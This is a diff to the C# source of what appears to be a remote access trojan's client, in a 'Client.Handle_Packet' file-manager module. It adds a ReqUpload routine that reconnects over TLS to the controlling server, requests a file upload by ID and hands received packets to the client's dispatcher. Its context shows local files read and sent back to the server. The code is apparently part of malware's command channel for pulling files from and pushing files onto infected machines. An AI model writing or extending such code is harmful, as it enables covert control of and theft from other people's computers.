@@ -12,6 +12,7 @@ using System.Net.Sockets;
 using System.Security.Authentication;
 using System.Net.Security;
 using System.Security.Cryptography.X509Certificates;
+using System.Threading;
 
 namespace Client.Handle_Packet
 {
@@ -121,8 +122,6 @@ namespace Client.Handle_Packet
                 msgpack2.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
                 ChunkSend(msgpack2.Encode2Bytes(), Client, SslClient);
 
-                Client.Shutdown(SocketShutdown.Both);
-                Client.Dispose();
             }
             catch
             {
@@ -159,6 +158,69 @@ namespace Client.Handle_Packet
             catch
             {
                 return;
+            }
+        }
+
+        public void ReqUpload(string id)
+        {
+            Socket Client = null;
+            SslStream SslClient = null;
+            try
+            {
+                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                {
+                    ReceiveBufferSize = 50 * 1024,
+                    SendBufferSize = 50 * 1024,
+                };
+                Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
+                SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
+                msgpack.ForcePathObject("ID").AsString = id;
+                ChunkSend(msgpack.Encode2Bytes(), Client, SslClient);
+
+
+                byte[] sslBuffer = new byte[4];
+                MemoryStream sslMS = new MemoryStream();
+                int sslSize = 0;
+                while (Client.Connected)
+                {
+                    while (sslMS.Length != 4)
+                    {
+                       int read = SslClient.Read(sslBuffer, 0, sslBuffer.Length);
+                        sslMS.Write(sslBuffer, 0, read);
+                        if (read == 0) break;
+                    }
+                    sslSize = BitConverter.ToInt32(sslMS.ToArray(), 0);
+                    sslBuffer = new byte[sslSize];
+                    sslMS.Dispose();
+                    sslMS = new MemoryStream();
+                    while (sslMS.Length != sslSize)
+                    {
+                       int read = SslClient.Read(sslBuffer, 0, sslBuffer.Length);
+                        if (read == 0) break;
+                        sslMS.Write(sslBuffer, 0, read);
+                        sslBuffer = new byte[sslSize - sslMS.Length];
+                    }
+                    ThreadPool.QueueUserWorkItem(Packet.Read, sslMS.ToArray());
+                    sslMS.Dispose();
+                    sslMS = new MemoryStream();
+                    sslBuffer = new byte[4];
+                    //SslClient?.Close();
+                    //Client?.Close();
+                    //SslClient?.Dispose();
+                    //Client?.Dispose();
+                    break;
+                }
+            }
+            catch
+            {
+                SslClient?.Dispose();
+                Client?.Dispose();
             }
         }
 
